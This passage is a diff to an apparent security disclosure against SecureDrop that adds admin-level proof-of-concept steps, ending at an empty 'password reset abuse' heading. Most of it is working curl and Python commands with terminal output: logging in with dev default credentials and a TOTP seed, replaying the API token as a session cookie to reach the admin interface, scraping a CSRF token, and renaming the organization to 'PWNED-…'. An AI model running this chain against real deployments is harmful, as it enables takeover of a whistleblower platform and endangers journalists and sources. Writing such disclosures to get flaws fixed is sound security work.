@@ -127,6 +127,8 @@ Connection: close
 
 ### Reproduction Steps
 
+# For User account:
+
 #### 1. Set Environment Variables
 
 ```bash
@@ -218,16 +220,193 @@ Connection: close
 **Patched System Response:**
 - HTTP 302 redirect to `/login`
 
-### Optional: Admin Impact Verification
+#: For Admin Level Account  Verification
 
-If you have an admin API token:
+Steps to reproduce:
+
+1. Get an admin API token (dev default account)
+From loaddata.py, default admin is journalist with same password/OTP seed.
+```bash
+┌──(keshav㉿kali)-[~/Downloads/securedrop]
+└─$ BASE=http://127.0.0.1:8081
+PASS='correct horse battery staple profanity oil chewy'
+OTP_SEED='JHCOGO7VCER3EJ4L'
+
+OTP=$(oathtool --totp --base32 "$OTP_SEED")
+ADMIN_RESP=$(curl -sS -X POST "$BASE/api/v1/token" \
+  -H 'Content-Type: application/json' \
+  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}")
+
+echo "$ADMIN_RESP"
+ADMIN_TOKEN=$(echo "$ADMIN_RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
+echo "ADMIN_TOKEN_LEN=${#ADMIN_TOKEN}"
+
+```
+My terminal output:
 
 ```bash
-curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20
+{
+  "expiration": "2026-02-17T02:09:07.174324+00:00", 
+  "journalist_first_name": null, 
+  "journalist_last_name": null, 
+  "journalist_uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979", 
+  "token": "ImNCZXdPVTltNmp3djV6M3JTeHZaWXA5NnBGVGJ2V1NudHhYUFFiS0c1U0Ui.aZOxog.b_ZieElUyqor_PXUro5FSzi4fz8"
+}
+ADMIN_TOKEN_LEN=95
+
 ```
 
-**If Vulnerable:**
-- HTTP 200 OK indicates full admin web access via API token replay
+
+
+Check it is admin:
+```bash
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq
+```
+You should see "is_admin": true.
+
+My terminal output:
+
+```bash
+┌──(keshav㉿kali)-[~/Downloads/securedrop]
+└─$ curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq
+
+{
+  "first_name": null,
+  "is_admin": true,
+  "last_login": "2026-02-17T00:09:07.174585",
+  "last_name": null,
+  "username": "journalist",
+  "uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979"
+}
+
+```
+
+
+2. Prove admin web takeover using only stolen token
+```bash
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20
+```
+If vulnerable, this is 1.1 200 OK and admin HTML.
+
+My terminal output:
+
+```bash
+┌──(keshav㉿kali)-[~/Downloads/securedrop]
+└─$ curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20
+
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.3 Python/3.12.3
+Date: Tue, 17 Feb 2026 00:09:20 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 12912
+Connection: close
+
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Admin Interface | SecureDrop</title>
+
+  <link rel="stylesheet" href="/static/css/journalist.css">
+
+  <link rel="icon" type="image/png" href="/static/i/favicon.png">
+
+  <!-- nosemgrep: generic.html-templates.security.unquoted-attribute-var.unquoted-attribute-var -->
+                                                                                
+```
+
+
+
+3. Prove config tampering (safe demo)
+Fetch CSRF from admin config page with stolen cookie-session:
+```bash
+CSRF_CFG=$(curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
+import re,sys
+h=sys.stdin.read()
+m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
+print(m.group(1) if m else "")
+')
+echo "$CSRF_CFG"
+```
+
+My terminal output:
+```bash
+┌──(keshav㉿kali)-[~/Downloads/securedrop]
+└─$ CSRF_CFG=$(curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
+import re,sys
+h=sys.stdin.read()
+m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
+print(m.group(1) if m else "")
+')
+echo "$CSRF_CFG"
+
+IjRmYTZjZmRmZjhlODMwNDI2YWEwNGY1MzU2YTFhMTRlMTA3MDNhNmYi.aZOxvQ.YOvuuiJQwsb3Js868y7IoQnVMho
+
+```
+
+
+3.1) Change org name:
+```bash
+NEW_ORG="PWNED-$(date +%s)"
+curl -i -s -X POST "$BASE/admin/update-org-name" \
+  -H "Cookie: js=$ADMIN_TOKEN" \
+  --data-urlencode "csrf_token=$CSRF_CFG" \
+  --data-urlencode "organization_name=$NEW_ORG" | head -n 15
+```
+
+My terminal output:
+
+```bash
+┌──(keshav㉿kali)-[~/Downloads/securedrop]
+└─$ NEW_ORG="PWNED-$(date +%s)"
+curl -i -s -X POST "$BASE/admin/update-org-name" \
+  -H "Cookie: js=$ADMIN_TOKEN" \
+  --data-urlencode "csrf_token=$CSRF_CFG" \
+  --data-urlencode "organization_name=$NEW_ORG" | head -n 15
+
+HTTP/1.1 302 FOUND
+Server: Werkzeug/2.2.3 Python/3.12.3
+Date: Tue, 17 Feb 2026 00:09:40 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 243
+Location: /admin/config#config-orgname
+Connection: close
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/admin/config#config-orgname">/admin/config#config-orgname</a>. If not, click the link.
+
+
+```
+
+Verify:
+```bash
+curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$NEW_ORG" && echo "CONFIG_TAMPER_SUCCESS"
+```
+
+My terminal Output:
+```bash
+┌──(keshav㉿kali)-[~/Downloads/securedrop]
+└─$ curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$NEW_ORG" && echo "CONFIG_TAMPER_SUCCESS"
+
+  <title>Instance Configuration | PWNED-1771286980</title>
+            alt="PWNED-1771286980 logo" width="250"></a>
+    <div><input id="organization_name" name="organization_name" required type="text" value="PWNED-1771286980"></div>
+  <img id="current-logo" src="/static/i/logo.png" class="logo small" alt="PWNED-1771286980" width="250">
+CONFIG_TAMPER_SUCCESS
+                       
+```
+
+
+
+4. Prove password reset abuse (higher impact)
+
 
 ---
 
